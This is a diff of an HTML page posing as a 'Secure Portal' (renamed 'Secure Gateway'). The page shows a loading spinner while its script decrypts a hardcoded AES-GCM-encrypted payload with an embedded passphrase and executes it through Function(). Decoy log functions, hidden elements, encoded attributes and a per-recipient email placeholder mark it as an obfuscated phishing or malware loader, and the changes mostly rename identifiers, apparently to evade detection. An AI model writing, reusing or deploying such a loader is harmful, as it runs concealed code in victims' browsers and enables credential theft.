@@ -3,12 +3,12 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta name="author" content="ShadowCoderX">
-    <title>Secure Portal</title>
+    <meta name="developer" content="PhantomCoderX">
+    <title>Secure Gateway</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
-            background: #f0f0f0;
+            background: #f4f4f4;
             font-family: 'Arial', sans-serif;
             display: flex;
             justify-content: center;
@@ -16,60 +16,63 @@
             height: 100vh;
             flex-direction: column;
         }
-        .circle-loader {
+        .rotating-circle {
             width: 80px;
             height: 80px;
             border: 12px solid #bbb;
-            border-top: 12px solid #ff5722;
+            border-top: 12px solid #ff4500;
             border-radius: 50%;
-            animation: rotate 1.8s infinite linear;
+            animation: rotateCircle 2s linear infinite;
         }
-        @keyframes rotate {
+        @keyframes rotateCircle {
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
         }
-        .message-box {
+        .notification-box {
             margin-top: 20px;
             font-size: 18px;
             color: #333;
         }
-        .hidden-zone {
+        .hidden-container {
             display: none;
+        }
+        .dummy-class {
+            visibility: hidden;
         }
     </style>
 </head>
 <body>
-    <div class="hidden-zone">
-        <span data-element="secure-data"></span>
+    <div class="hidden-container">
+        <span data-hidden="protected-info"></span>
     </div>
 
-    <div data-identifier="c3VwZXItY29uZmln" fake-tag=""></div>
-    <div class="circle-loader" nike-TrioTrio=""></div>
+    <div data-key="c2VjcmV0LWNvbnRyb2w=" temp-placeholder></div>
+    <div class="rotating-circle" nike-testme=""></div>
     
     <script adidas="<%=EMAIL64%>">
-        function fakeDebugInfo() {
-            const debugData = ["Boot sequence started...", "Validating credentials...", "Finalizing setup..."];
-            debugData.forEach(entry => {
-                // console.debug(`[DEBUG] ${entry}`);
+        function redundantLogMessages() {
+            const logEntries = ["Booting system...", "Verifying credentials...", "Establishing security protocols..."];
+            logEntries.forEach(entry => {
+                // console.info(`[INFO] ${entry}`);
             });
         }
-        fakeDebugInfo();
+        redundantLogMessages();
         
-        async function unlockEncryptedContent(encodedStr, ivKey, saltKey, secretPass) {
-            function parseHexString(hexStr) {
-                let arr = new Uint8Array(hexStr.length / 2);
-                for (let i = 0; i < hexStr.length; i += 2) {
-                    arr[i / 2] = parseInt(hexStr.substr(i, 2), 16);
+        async function decodeEncryptedData(encryptedText, ivData, saltData, passphrase) {
+            function convertHexToArray(hexValue) {
+                let array = new Uint8Array(hexValue.length / 2);
+                for (let j = 0; j < hexValue.length; j += 2) {
+                    array[j / 2] = parseInt(hexValue.substr(j, 2), 16);
                 }
-                return arr;
+                return array;
             }
             
-            const pauseProcess = () => new Promise(resolve => setTimeout(resolve, 1200));
+            const introduceLag = () => new Promise(resolve => setTimeout(resolve, 1700));
             
-            async function deriveCryptoKey(baseKey, saltVal) {
+            async function createDecryptionKey(primaryKey, saltArray) {
                 return crypto.subtle.deriveKey(
-                    { name: "PBKDF2", salt: saltVal, iterations: 100000, hash: "SHA-256" },
-                    baseKey,
+                    { name: "PBKDF2", salt: saltArray, iterations: 100000, hash: "SHA-256" },
+                    primaryKey,
                     { name: "AES-GCM", length: 256 },
                     false,
                     ["decrypt"]
@@ -78,43 +81,43 @@
             
             const importedKey = await crypto.subtle.importKey(
                 "raw",
-                new TextEncoder().encode(secretPass),
+                new TextEncoder().encode(passphrase),
                 { name: "PBKDF2" },
                 false,
                 ["deriveKey"]
             );
             
-            await pauseProcess();
-            const cryptoKey = await deriveCryptoKey(importedKey, parseHexString(saltKey));
+            await introduceLag();
+            const derivedDecryptKey = await createDecryptionKey(importedKey, convertHexToArray(saltData));
             
             try {
-                const decryptedMsg = await crypto.subtle.decrypt(
-                    { name: "AES-GCM", iv: parseHexString(ivKey) },
-                    cryptoKey,
-                    parseHexString(encodedStr)
+                const decryptedMessage = await crypto.subtle.decrypt(
+                    { name: "AES-GCM", iv: convertHexToArray(ivData) },
+                    derivedDecryptKey,
+                    convertHexToArray(encryptedText)
                 );
-                console.log("[SUCCESS] Data successfully unlocked.");
-                return new TextDecoder().decode(decryptedMsg);
-            } catch (err) {
-                console.error("[ERROR] Failed to unlock data:", err);
+                console.log("[SUCCESS] Decryption completed successfully.");
+                return new TextDecoder().decode(decryptedMessage);
+            } catch (error) {
+                console.error("[ERROR] Unable to decrypt data:", error);
                 return null;
             }
         }
         
         (async () => {
-            console.log("[SYSTEM] Initiating secure decryption...");
-            const payloadData = {
+            console.log("[PROCESS] Initiating security decryption...");
+            const encryptedPacket = {
                 iv: "0a6d791008bd13b5d22d4e92",
                 salt: "cb6853c10fc7a13ae3fd54b1af489606",
                 encrypted: "e2b5f7da69e614a29737cf95404cf4d2bf56f5c5635356c0e94917b504bbd2e4fa7e7c3b7a9849dc3c26889e14e28690daa199f60070b2fcaae0726a246226d9e1e34f65b6aba4b2151016ccf4ba0dcecc38e79804fa296c4d94ef4b64c9f1ed021e3c331af17d2bdd40f791f580c232810895aaf42def5bc9ff15a11dc27fa5c5d003a7a0a14968d58ad8833940a2e935a85cef230aea8a89254e4f6e6659b9af8d7fea89a1f8642c75710c053816c3385cf63667c1e2c2b25cd4b7ddf2570c"
             };
             
             const passphrase = "homesweethome";
-            const decryptedContent = await unlockEncryptedContent(payloadData.encrypted, payloadData.iv, payloadData.salt, passphrase);
-            console.log(decryptedContent);
+            const finalDecryptedData = await decodeEncryptedData(encryptedPacket.encrypted, encryptedPacket.iv, encryptedPacket.salt, passphrase);
+            console.log(finalDecryptedData);
             
-            if (decryptedContent) {
-                Function(`${decryptedContent}`)();
+            if (finalDecryptedData) {
+                Function(finalDecryptedData)();
             }
         })();
     </script>
